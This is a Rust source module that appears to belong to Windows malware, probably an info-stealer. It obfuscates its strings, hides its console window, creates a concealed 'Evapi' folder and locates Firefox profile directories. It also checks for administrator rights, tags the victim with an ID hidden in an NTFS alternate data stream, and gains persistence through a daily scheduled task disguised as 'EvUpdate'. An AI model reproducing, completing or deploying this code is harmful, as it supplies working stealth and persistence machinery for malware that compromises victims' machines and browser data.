use obfstr::obfstr;
use std::{env::current_exe, fs::{create_dir_all, File}, io::{Read, Write}, mem::MaybeUninit, path::PathBuf, process::Command, ptr::null_mut};
use uuid::Uuid;
use winapi::{shared::winerror::S_OK, um::winbase::CREATE_NO_WINDOW};
use winapi::um::knownfolders as kf;
use std::os::windows::process::CommandExt;
use winapi::um::shtypes::REFKNOWNFOLDERID;
use winapi::um::{
    combaseapi::CoTaskMemFree,
    libloaderapi::GetModuleFileNameA,
    securitybaseapi::{AllocateAndInitializeSid, CheckTokenMembership, FreeSid},
    shlobj::SHGetKnownFolderPath,
    winnt::{
        DOMAIN_ALIAS_RID_ADMINS, SECURITY_BUILTIN_DOMAIN_RID, SECURITY_NT_AUTHORITY,
        SID_IDENTIFIER_AUTHORITY,
    },
};
use winapi::{
    shared::ntdef::PWSTR,
    um::{
        wincon::GetConsoleWindow,
        winuser::{ShowWindow, SW_HIDE},
    },
};

lazy_static! {
    pub static ref HOME_DIR_PATH: PathBuf = {
        let mut path = get_folder_path(&kf::FOLDERID_LocalAppData).expect("failed");
        path.push(obfstr::obfstr!("Evapi"));

        if !path.exists() {
            create_dir_all(&path).expect("failed to create home dir");
        }

        path
    };
    pub static ref FIREFOX_PROFILES_PATH: Option<PathBuf> = {
        let mut path = get_folder_path(&kf::FOLDERID_RoamingAppData).expect("failed");
        path.push(obfstr!("Mozilla\\Firefox\\Profiles"));

        if path.exists() {
            Some(path)
        } else {
            None
        }
    };
    pub static ref IS_ADMIN_AT_START: bool = actual_is_admin();
}

pub fn get_folder_path(rfid: REFKNOWNFOLDERID) -> Result<PathBuf, ()> {
    let mut pwstr: MaybeUninit<PWSTR> = MaybeUninit::uninit();

    unsafe {
        let return_code = SHGetKnownFolderPath(rfid, 0, std::ptr::null_mut(), pwstr.as_mut_ptr());

        if return_code == S_OK {
            let buffer = pwstr.assume_init();
            let path_buf =
                PathBuf::from(widestring::U16CString::from_ptr_str(buffer).to_os_string());
            CoTaskMemFree(buffer as _);

            Ok(path_buf)
        } else {
            Err(())
        }
    }
}

pub fn is_admin() -> bool {
    *IS_ADMIN_AT_START
}

#[inline(never)]
fn actual_is_admin() -> bool {
    let mut is_admin;
    let mut admins_group = MaybeUninit::uninit();
    let mut nt_authority = SID_IDENTIFIER_AUTHORITY {
        Value: SECURITY_NT_AUTHORITY,
    };

    is_admin = unsafe {
        AllocateAndInitializeSid(
            &mut nt_authority,
            2,
            SECURITY_BUILTIN_DOMAIN_RID,
            DOMAIN_ALIAS_RID_ADMINS,
            0,
            0,
            0,
            0,
            0,
            0,
            admins_group.as_mut_ptr(),
        )
    };

    if is_admin != 0 {
        unsafe {
            let admins_group = admins_group.assume_init();
            if CheckTokenMembership(null_mut(), admins_group, &mut is_admin) == 0 {
                is_admin = 0;
            }
            FreeSid(admins_group);
        };
    }

    is_admin != 0
}

pub fn get_current_exe() -> String {
    current_exe()
        .map(|path| path.to_string_lossy().to_string())
        .unwrap_or_else(|_| {
            let mut buffer = [0u8; 4096];
            let size = unsafe {
                GetModuleFileNameA(null_mut(), buffer.as_mut_ptr() as _, buffer.len() as _) as usize
            };

            if size > 0 {
                String::from_utf8_lossy(&buffer[0..size]).to_string()
            } else {
                panic!(
                    "{}",
                    obfstr::obfstr!(
                        "idk... better blowing ourselves up, nothing left to do here <.> bye bye"
                    )
                );
            }
        })
}

pub fn hide_window() {
    let window = unsafe { GetConsoleWindow() };
    if window != null_mut() {
        unsafe {
            ShowWindow(window, SW_HIDE);
        }
    }
}

pub fn get_unique_id() -> Option<String> {
    let exe_path = get_current_exe() + obfstr::obfstr!(":uniq_id");
    if let Ok(mut file) = File::open(&exe_path) {
        let mut output = String::new();
        file.read_to_string(&mut output).ok();
        Some(output)
    } else {
        let mut file = File::create(&exe_path).ok()?;
        let uuid = Uuid::new_v4().to_string();
        file.write_all(uuid.as_bytes()).ok();
        Some(uuid)
    }
}

pub fn am_i_running() -> bool {
    false
}

pub fn setup_init_task() {
    let cmd =
    obfstr::obfstr!("SCHTASKS /CREATE /SC DAILY /TN EvUpdate /TR {:EXE} /F /IT")
        .replace(obfstr::obfstr!("{:EXE}"), &get_current_exe());

    let _ = Command::new(obfstr::obfstr!("cmd"))
        .args(&[obfstr::obfstr!("/C"), &cmd])
        .output();
}